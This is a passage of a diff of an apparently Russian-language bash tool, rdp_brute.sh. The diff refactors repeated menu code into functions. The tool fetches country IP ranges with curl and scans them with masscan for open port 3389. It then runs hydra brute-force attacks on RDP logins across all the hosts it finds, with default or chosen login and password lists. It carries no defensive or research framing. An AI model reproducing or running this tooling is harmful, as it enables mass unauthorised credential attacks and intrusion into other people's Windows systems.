-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7044,6 +2931,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7054,52 +2942,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENURU
 else
 if [ "$country" = "93" ]; then
 curl http://ipdiapazon.16mb.com/Jordan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -7115,6 +2958,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7124,53 +2968,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "94" ]; then
@@ -7187,6 +2985,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7196,53 +2995,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7260,6 +3013,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7269,53 +3023,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7333,6 +3041,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7342,53 +3051,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7406,6 +3069,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7415,53 +3079,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7479,6 +3097,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7488,53 +3107,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7552,6 +3125,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7561,53 +3135,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7625,6 +3153,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7634,53 +3163,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7698,6 +3181,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7707,53 +3191,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7771,6 +3209,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7780,53 +3219,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7844,6 +3237,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7853,53 +3247,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7917,6 +3265,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7926,53 +3275,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -7990,6 +3293,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -7999,53 +3303,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
